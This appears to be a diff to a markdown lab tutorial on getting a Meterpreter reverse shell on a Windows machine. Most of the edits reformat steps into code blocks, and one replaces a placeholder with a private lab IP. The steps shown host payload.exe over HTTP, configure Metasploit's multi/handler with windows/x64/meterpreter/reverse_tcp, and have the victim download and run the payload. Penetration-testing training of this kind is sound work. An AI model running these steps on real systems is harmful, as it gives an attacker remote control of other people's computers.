@@ -47,7 +47,7 @@ LPORT → Listening port
 
 Start a simple HTTP server to allow the victim machine to download the payload.
 
-python3 -m http.server 8080
+```python3 -m http.server 8080```
 
 Your payload will be accessible at:
 
@@ -59,27 +59,14 @@ http://<ATTACKER_IP>:8080/payload.exe
 
 Start Metasploit console:
 
-msfconsole
-
-Load the multi handler:
-
-use exploit/multi/handler
-
-Set the payload:
-
-set payload windows/x64/meterpreter/reverse_tcp
-
-Set attacker IP:
-
-set LHOST <ATTACKER_IP>
-
-Set port:
-
-set LPORT 4444
-
-Run the handler:
-
+```msfconsole: 
+use exploit/multi/handler 
+set payload windows/x64/meterpreter/reverse_tcp 
+set LHOST 192.168.218.128 
+set LPORT 4444 
 run
+```
+
 
 Metasploit will now wait for an incoming connection.
 
@@ -92,7 +79,9 @@ On the Windows machine:
 1. Open browser
 2. Visit:
 
+```
 http://<ATTACKER_IP>:8080/payload.exe
+```
 
 3. Download the file
 4. Execute it
